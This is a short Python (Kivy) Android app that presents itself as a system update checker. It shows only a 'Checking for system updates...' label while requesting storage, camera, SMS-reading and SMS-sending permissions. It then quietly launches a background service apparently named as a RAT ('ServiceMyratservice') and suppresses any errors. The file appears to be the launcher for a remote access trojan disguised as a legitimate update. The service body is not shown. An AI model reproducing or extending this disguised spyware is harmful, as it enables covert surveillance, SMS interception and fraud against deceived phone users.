from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission

class SystemUpdateApp(App):
    def build(self):
        # Meminta izin akses saat aplikasi dibuka
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.CAMERA,
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.FOREGROUND_SERVICE
        ], self.start_service)
        
        return Label(text="Checking for system updates...")

    def start_service(self, permissions, results):
        try:
            from jnius import autoclass
            service = autoclass('org.test.myapp.ServiceMyratservice')
            context = autoclass('org.kivy.android.PythonActivity').mActivity
            service.start(context, "")
        except Exception as e:
            pass

if __name__ == '__main__':
    SystemUpdateApp().run()
